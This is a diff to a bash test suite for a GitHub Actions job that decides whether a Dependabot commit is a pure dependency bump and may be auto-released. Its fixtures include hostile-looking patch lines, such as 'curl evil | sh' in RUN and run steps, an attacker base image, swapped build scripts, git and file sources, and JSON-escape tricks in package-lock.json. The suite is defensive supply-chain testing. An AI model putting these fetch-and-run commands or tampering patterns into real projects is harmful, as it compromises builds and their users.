@@ -130,6 +130,8 @@ out() { sed -n "s/^$1=//p" <<<"$OUTPUT"; }
 REPO_NAME=leinardi/example
 BOT_JSON='{"login": "dependabot[bot]", "type": "Bot"}'
 HUMAN_JSON='{"login": "leinardi", "type": "User"}'
+# GitHub commits Dependabot's work (and a merge made in the UI) as web-flow.
+WEB_FLOW_JSON='{"login": "web-flow", "type": "User"}'
 N=0
 # A fresh stub state whose last release is v1.2.3 (beside the moving v1, an older release and a
 # higher one that sorts below it as text), and an empty comparison.
@@ -163,7 +165,8 @@ commit() {
 		parents=$(jq -cn --arg a "$(sha_of 1)" '[{sha: $a}]')
 	fi
 	COMMITS=$(jq -c --arg sha "$sha" --argjson author "$1" --argjson verified "$2" --arg msg "$3" --argjson parents "$parents" \
-		'. + [{sha: $sha, parents: $parents, author: $author, commit: {message: $msg, verification: {verified: $verified}}}]' <<<"$COMMITS")
+		--argjson committer "${COMMITTER_JSON:-$WEB_FLOW_JSON}" \
+		'. + [{sha: $sha, parents: $parents, author: $author, committer: $committer, commit: {message: $msg, verification: {verified: $verified}}}]' <<<"$COMMITS")
 	HEAD_SHA=$sha
 	LAST_SHA=$sha
 }
@@ -188,7 +191,7 @@ compare() {
 }
 authorize() {
 	run_step authorize GH_TOKEN=x REPO="$REPO_NAME" EVENT="${EVENT:-push}" REF="${REF:-refs/heads/main}" \
-		SHA="${SHA_IN:-$HEAD_SHA}" DEFAULT_BRANCH=main TAG_PREFIX="${PREFIX-v}" AUTHORIZE_DELAY=0
+		SHA="${SHA_IN:-$HEAD_SHA}" DEFAULT_BRANCH=main TAG_PREFIX="${PREFIX-v}" ECOSYSTEMS="${ECOS:-}" AUTHORIZE_DELAY=0
 }
 expect_release() {
 	if [ "$STATUS" -eq 0 ] && [ "$(out authorized)" = true ] && [ "$(out version)" = "$2" ] && [ "$(out tag)" = "${3:-v$2}" ]; then
@@ -432,7 +435,7 @@ dependabot_pr 7
 add_file '{"filename": "trivy-gate/action.yaml", "status": "modified", "patch": "@@ -1 +1 @@\n-  run: old\n+  run: curl evil | sh"}'
 compare
 authorize
-expect_skip "a commit attributed to Dependabot (a borrowed author, signed by its committer) that changes more than pins ships nothing" "changes more than action pins"
+expect_skip "a commit attributed to Dependabot (a borrowed author, signed by its committer) that changes more than pins ships nothing" "changes more than Dependabot's updates"
 if grep -q 'run: old' <<<"$LOG"; then ok "... naming the line"; else not_ok "... naming the line" "$LOG"; fi
 
 fixture
@@ -517,7 +520,7 @@ dependabot_pr 7
 add_file '{"filename": "action.yaml", "status": "modified", "patch": "@@ -3 +3 @@\n-    rev: v1\n+    rev: v2"}'
 compare
 authorize
-expect_skip "a rev: line outside .pre-commit-config.yaml is more than a pin bump" "changes more than action pins"
+expect_skip "a rev: line outside .pre-commit-config.yaml is more than a pin bump" "changes more than Dependabot's updates"
 
 fixture
 dependabot_pr 7
@@ -525,6 +528,140 @@ FILES=$(jq -c '[range(300) as $i | .[0] | .filename = "f\($i)"]' <<<"$FILES")
 compare
 authorize
 expect_fail "a file list the API may have truncated fails" "malformed or incomplete"
+
+fixture
+COMMITTER_JSON="$HUMAN_JSON" commit "$BOT_JSON" true "fix(deps): bump something"
+compare
+authorize
+expect_skip "a commit authored by Dependabot but committed by someone else (pushed from a clone) is not Dependabot's" "committed by GitHub"
+
+fixture
+SHA_IN=$(sha_of 5) ECOS="docker rust" authorize
+expect_fail "an unknown ecosystem is refused" "ecosystems holds 'rust'"
+
+# One file changed beside the default pin bump, with the ecosystems given: ecosystem_case
+# <release|skip> <description> <ecosystems> <file> <patch> [skip message].
+MORE_THAN_UPDATES="changes more than Dependabot's updates"
+ecosystem_case() {
+	fixture
+	dependabot_pr 7
+	add_file "$(jq -cn --arg f "$4" --arg p "$5" '{filename: $f, status: "modified", patch: $p}')"
+	compare
+	ECOS="$3" authorize
+	if [ "$1" = release ]; then
+		expect_release "$2" 1.10.1
+	else
+		expect_skip "$2" "${6:-$MORE_THAN_UPDATES}"
+	fi
+}
+DF=deployments/docker/Dockerfile
+FROM_TAG=$'@@ -136 +136 @@\n-FROM dhi.io/static:20250419 AS base\n+FROM dhi.io/static:20250601 AS base'
+ecosystem_case release "docker: a FROM tag bump ships" docker "$DF" "$FROM_TAG"
+ecosystem_case skip "docker: without the ecosystem, a FROM bump is a human's release" "" "$DF" "$FROM_TAG"
+ecosystem_case release "docker: a digest bump with its tag, under --platform, ships" "docker cargo" Dockerfile \
+	$'@@ -30,2 +30,2 @@\n-FROM ubuntu:26.04@sha256:'"$(printf 'a%.0s' {1..64})"$' AS base\n-FROM --platform=$BUILDPLATFORM dhi.io/rust:1.98.1-debian13-dev AS build\n+FROM ubuntu:26.04@sha256:'"$(printf 'b%.0s' {1..64})"$' AS base\n+FROM --platform=$BUILDPLATFORM dhi.io/rust:1.99.0-debian13-dev AS build'
+ecosystem_case skip "docker: another image in place of the base is not a bump" docker "$DF" \
+	$'@@ -136 +136 @@\n-FROM dhi.io/static:20250419 AS base\n+FROM attacker.io/static:20250601 AS base'
+ecosystem_case skip "docker: a renamed stage is not a bump" docker "$DF" \
+	$'@@ -136 +136 @@\n-FROM dhi.io/static:20250419 AS base\n+FROM dhi.io/static:20250601 AS other'
+ecosystem_case skip "docker: a changed RUN line is not a bump" docker "$DF" \
+	$'@@ -140 +140 @@\n-RUN make\n+RUN curl evil | sh'
+ecosystem_case skip "docker: a FROM line added beside the bump is not a bump" docker "$DF" \
+	$'@@ -136 +136,2 @@\n-FROM dhi.io/static:20250419 AS base\n+FROM dhi.io/static:20250601 AS base\n+FROM attacker/x:1 AS y' "1 line(s) removed, 2 added"
+ecosystem_case release "cargo: a version requirement in Cargo.toml, plain and in a table, ships" cargo Cargo.toml \
+	$'@@ -20,2 +20,2 @@\n-log = "0.4.34"\n-tokio-tungstenite = { version = "0.29.0", features = ["rustls"] }\n+log = "0.4.35"\n+tokio-tungstenite = { version = "0.30.0", features = ["rustls"] }'
+ecosystem_case skip "cargo: a build script swapped in Cargo.toml is not a bump" cargo Cargo.toml \
+	$'@@ -5 +5 @@\n-build = "build.rs"\n+build = "evil.rs"'
+ecosystem_case skip "cargo: a dependency moved to git is not a bump" cargo crates/core/Cargo.toml \
+	$'@@ -20 +20 @@\n-log = "0.4.34"\n+log = { git = "https://example.com/log" }'
+LOCK=$'@@ -1461,9 +1461,9 @@ dependencies = [\n \n [[package]]\n name = "log"\n-version = "0.4.34"\n+version = "0.4.35"\n source = "registry+https://github.com/rust-lang/crates.io-index"\n-checksum = "'"$(printf 'f%.0s' {1..64})"$'"\n+checksum = "'"$(printf '5%.0s' {1..64})"$'"\n \n [[package]]\n+name = "new-dep"\n+version = "1.0.0"\n+source = "registry+https://github.com/rust-lang/crates.io-index"\n+dependencies = [\n+ "log",\n+ "serde 1.0.1 (registry+https://github.com/rust-lang/crates.io-index)",\n+]'
+ecosystem_case release "cargo: Cargo.lock versions, checksums and a new crates.io package ship" cargo Cargo.lock "$LOCK"
+ecosystem_case skip "cargo: without the ecosystem, Cargo.lock is a human's release" docker Cargo.lock "$LOCK"
+ecosystem_case skip "cargo: a Cargo.lock source outside crates.io is not a bump" cargo Cargo.lock \
+	$'@@ -1 +1 @@\n-source = "registry+https://github.com/rust-lang/crates.io-index"\n+source = "git+https://example.com/log#abc"' "git+https"
+GOMOD=$'@@ -24,7 +24,8 @@ require (\n \tgithub.com/stretchr/testify v1.12.1\n-\tgolang.org/x/crypto v0.57.0\n+\tgolang.org/x/crypto v0.58.0\n+\tgolang.org/x/tools v0.51.0 // indirect\n \tgolang.org/x/sync v0.24.0\n@@ -3 +3 @@\n-go 1.26.0\n+go 1.26.1\n-toolchain go1.26.9\n+toolchain go1.26.10'
+ecosystem_case release "gomod: go.mod requirements, an indirect one added, go and toolchain ship" gomod go.mod "$GOMOD"
+ecosystem_case skip "gomod: a replace added to go.mod is not a bump" gomod go.mod \
+	$'@@ -90 +90,2 @@\n )\n+replace golang.org/x/crypto => example.com/crypto v0.58.0' "replace"
+ecosystem_case release "gomod: go.sum hashes ship" gomod go.sum \
+	$'@@ -152,2 +152,2 @@\n-golang.org/x/crypto v0.57.0 h1:3ZVCjf8Ggz7zneR/EHRVx68Ctf+2pmIMP2UFhh9cC6M=\n-golang.org/x/crypto v0.57.0/go.mod h1:Fdz0i5U6CoizGwLda9DttjSk6qlZo25zYNtR+ycvuZA=\n+golang.org/x/crypto v0.58.0 h1:COkYLr4k7nDI4r6QtMML2AfzeIswWHAJthLS6K/M/54=\n+golang.org/x/crypto v0.58.0/go.mod h1:Xh+kl5A+M0gMiWDytH2Hhr5Z7WbNCpv/eB/EFgfSk+w='
+ecosystem_case skip "gomod: a go.sum line that is no hash is not a bump" gomod go.sum $'@@ -1 +1 @@\n-a v1.0.0 h1:x=\n+anything'
+ecosystem_case release "npm: a dependency version in package.json ships" npm web/package.json \
+	$'@@ -20 +20 @@\n-    "vite": "^7.1.0",\n+    "vite": "^7.1.2",'
+ecosystem_case skip "npm: a changed script in package.json is not a bump" npm web/package.json \
+	$'@@ -8 +8 @@\n-    "build": "vite build",\n+    "build": "curl evil 2"'
+ecosystem_case release "npm: package-lock.json from registry.npmjs.org ships" npm web/package-lock.json \
+	$'@@ -100,4 +100,4 @@\n     "node_modules/vite": {\n-      "version": "7.1.0",\n-      "resolved": "https://registry.npmjs.org/vite/-/vite-7.1.0.tgz",\n+      "version": "7.1.2",\n+      "resolved": "https://registry.npmjs.org/vite/-/vite-7.1.2.tgz",'
+ecosystem_case skip "npm: a package-lock.json resolved outside registry.npmjs.org is not a bump" npm web/package-lock.json \
+	$'@@ -101 +101 @@\n-      "resolved": "https://registry.npmjs.org/vite/-/vite-7.1.0.tgz",\n+      "resolved": "git+https://example.com/vite.git",' "example.com"
+ecosystem_case skip "npm: a linked package in package-lock.json is not a bump" npm web/package-lock.json \
+	$'@@ -101 +101 @@\n-      "version": "7.1.0",\n+      "link": true,' 'link'
+
+# Each rule's reach: an ecosystem that is not listed leaves its files to the action-pin rule.
+ecosystem_case skip "cargo: without the ecosystem, Cargo.toml is a human's release" docker Cargo.toml \
+	$'@@ -20 +20 @@\n-log = "0.4.34"\n+log = "0.4.35"'
+ecosystem_case skip "gomod: without the ecosystem, go.mod is a human's release" docker go.mod "$GOMOD"
+ecosystem_case skip "npm: without the ecosystem, package.json is a human's release" docker web/package.json \
+	$'@@ -20 +20 @@\n-    "vite": "^7.1.0",\n+    "vite": "^7.1.2",'
+NPM_LOCK=$'@@ -100,4 +100,4 @@\n     "node_modules/vite": {\n-      "version": "7.1.0",\n-      "resolved": "https://registry.npmjs.org/vite/-/vite-7.1.0.tgz",\n+      "version": "7.1.2",\n+      "resolved": "https://registry.npmjs.org/vite/-/vite-7.1.2.tgz",'
+ecosystem_case skip "npm: without the ecosystem, package-lock.json is a human's release" docker web/package-lock.json "$NPM_LOCK"
+ecosystem_case release "ecosystems split on tabs and newlines (a YAML block) like on spaces" $'gomod\tnpm\n' web/package-lock.json "$NPM_LOCK"
+
+# Cargo.toml: only the requirement moves.
+ecosystem_case skip "cargo: a changed feature list beside the version is not a bump" cargo Cargo.toml \
+	$'@@ -20 +20 @@\n-log = { version = "1", features = ["a"] }\n+log = { version = "2", features = ["b"] }'
+ecosystem_case skip "cargo: a version beside a git source is not a plain requirement" cargo Cargo.toml \
+	$'@@ -20 +20 @@\n-log = { git = "https://example.com/log", version = "1" }\n+log = { git = "https://example.com/log", version = "2" }'
+
+# Cargo.lock: each line's shape, removed lines included.
+ecosystem_case skip "cargo: a Cargo.lock dependency entry with a git source is not a bump" cargo Cargo.lock \
+	$'@@ -5 +5 @@\n- "log 0.4.34",\n+ "log 0.4.35 (git+https://example.com/log#abc)",' "git+https"
+ecosystem_case skip "cargo: a Cargo.lock version that is not a version is not a bump" cargo Cargo.lock \
+	$'@@ -5 +5 @@\n-version = "0.4.34"\n+version = "0.4.35 (git+https://example.com)"' "example.com"
+ecosystem_case skip "cargo: a removed Cargo.lock line is checked too" cargo Cargo.lock \
+	$'@@ -90,2 +90 @@\n-[[patch.unused]]\n-name = "log"\n+name = "log"' "patch.unused"
+
+# go.mod and go.sum.
+ecosystem_case skip "gomod: a requirement replaced inline is not a bump" gomod go.mod \
+	$'@@ -24 +24 @@\n-\tgolang.org/x/crypto v0.57.0\n+\tgolang.org/x/crypto v0.58.0 => example.com/crypto v0.58.0' "example.com"
+ecosystem_case skip "gomod: a retract line is not a requirement" gomod go.mod $'@@ -90 +90,2 @@\n )\n+retract v1.0.0' "retract"
+ecosystem_case skip "gomod: a go.sum hash that is no h1 hash is not a bump" gomod go.sum \
+	$'@@ -152 +152 @@\n-golang.org/x/crypto v0.57.0 h1:3ZVCjf8Ggz7zneR/EHRVx68Ctf+2pmIMP2UFhh9cC6M=\n+golang.org/x/crypto v0.58.0 h1:short=' "short"
+
+# Dockerfile FROM: a reference on both sides, and a digest is never dropped.
+ecosystem_case skip "docker: a dropped digest is not a bump" docker "$DF" \
+	$'@@ -1 +1 @@\n-FROM golang:1.22@sha256:'"$(printf 'a%.0s' {1..64})"$' AS b\n+FROM golang:1.23 AS b' "golang:1.23"
+ecosystem_case skip "docker: a dropped tag and digest (floating on latest) is not a bump" docker "$DF" \
+	$'@@ -1 +1 @@\n-FROM golang:1.22 AS b\n+FROM golang AS b' "golang AS b"
+ecosystem_case skip "docker: a stage reference turned into an image is not a bump" docker "$DF" \
+	$'@@ -9 +9 @@\n-FROM build AS final\n+FROM build:1 AS final' "build:1"
+
+# package-lock.json: an allowlist, with each resolved tied to its own entry.
+NPM_ENTRY=$'@@ -100,4 +100,4 @@\n     "node_modules/lodash": {\n-      "version": "4.17.20",\n-      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz",\n'
+ecosystem_case skip "npm: a resolved spelled with a JSON escape is not a bump" npm web/package-lock.json \
+	"$NPM_ENTRY"$'+      "version": "4.17.21",\n+      "\\u0072esolved": "file:../../evil",' "u0072"
+ecosystem_case skip "npm: a link spelled with a JSON escape is not a bump" npm web/package-lock.json \
+	"$NPM_ENTRY"$'+      "version": "4.17.21",\n+      "\\u006cink": true,' "u006c"
+ecosystem_case skip "npm: another registry package under an entry is not a bump" npm web/package-lock.json \
+	"$NPM_ENTRY"$'+      "version": "6.6.6",\n+      "resolved": "https://registry.npmjs.org/evil-pkg/-/evil-pkg-6.6.6.tgz",' "evil-pkg"
+ecosystem_case skip "npm: a resolved for another version than its entry's is not a bump" npm web/package-lock.json \
+	"$NPM_ENTRY"$'+      "version": "4.17.21",\n+      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz",' "lodash-4.17.20.tgz"
+ecosystem_case skip "npm: a resolved whose entry is not in the patch is not a bump" npm web/package-lock.json \
+	$'@@ -101,2 +101,2 @@\n       "version": "4.17.21",\n-      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz",\n+      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",' "lodash-4.17.21.tgz"
+ecosystem_case skip "npm: an alias (a name in an entry) is not a bump" npm web/package-lock.json \
+	"$NPM_ENTRY"$'+      "name": "evil-pkg",\n+      "version": "4.17.21",' "evil-pkg"
+ecosystem_case skip "npm: any backslash in an added line is refused, even where the key allows a free string" npm web/package-lock.json \
+	"$NPM_ENTRY"$'+      "version": "4.17.21",\n+      "deprecated": "use \\u0022other",' "deprecated"
+ecosystem_case skip "npm: an install script flag is not a bump" npm web/package-lock.json \
+	"$NPM_ENTRY"$'+      "version": "4.17.21",\n+      "hasInstallScript": true,' "hasInstallScript"
+ecosystem_case skip "npm: a dependency spec that is a git URL is not a bump" npm web/package-lock.json \
+	$'@@ -110 +110 @@\n-        "lodash": "^4.17.20"\n+        "lodash": "git+https://example.com/x.git"' "example.com"
+ecosystem_case skip "npm: a version that is a path is not a bump" npm web/package-lock.json \
+	"$NPM_ENTRY"$'+      "version": "file:../evil",' "file:"
+ecosystem_case release "npm: a scoped package nested under another resolves from its own name" npm web/package-lock.json \
+	$'@@ -200,3 +200,3 @@\n     "node_modules/a/node_modules/@scope/b": {\n-      "version": "1.0.0",\n-      "resolved": "https://registry.npmjs.org/@scope/b/-/b-1.0.0.tgz",\n+      "version": "1.0.1",\n+      "resolved": "https://registry.npmjs.org/@scope/b/-/b-1.0.1.tgz",\n+      "integrity": "sha512-AAAA+/==",'
+ecosystem_case release "npm: a new entry with engines, dependencies and license ships" npm web/package-lock.json \
+	$'@@ -300 +300,12 @@\n     },\n+    "node_modules/new-dep": {\n+      "version": "2.0.0",\n+      "resolved": "https://registry.npmjs.org/new-dep/-/new-dep-2.0.0.tgz",\n+      "integrity": "sha512-BBBB",\n+      "dev": true,\n+      "license": "MIT",\n+      "dependencies": {\n+        "@vue/shared": "3.5.0"\n+      },\n+      "engines": {\n+        "node": "^20.19.0 || >=22.12.0"\n+      }\n+    },'
 
 echo "# mark"
 
@@ -572,6 +709,8 @@ got:  $2"; fi
 perms() { wf ".jobs.$1.permissions | to_entries | map(.key + \":\" + .value) | join(\" \")"; }
 check "authorize: read-only, pull requests and contents" "$(perms authorize)" "contents:read pull-requests:read"
 check "authorize: no checkout and no repository code" "$(wf '[.jobs.authorize.steps[] | select(.uses != null)] | length')" "0"
+check "authorize: the ecosystems reach the script through env" "$(wf '.jobs.authorize.steps[0].env.ECOSYSTEMS')" "\${{ inputs.ecosystems }}"
+check "the ecosystems default to none: action pins only, as before" "$(wf '.on.workflow_call.inputs.ecosystems.default')" ""
 check "authorize: only a push whose head merges a dependabot/ branch spends a runner" "$(wf '.jobs.authorize.if')" \
 	"github.event_name == 'push' && startsWith(github.event.head_commit.message, 'Merge pull request #') && contains(github.event.head_commit.message, '/dependabot/')"
 check "ci: actions and contents read only" "$(perms ci)" "actions:read contents:read"
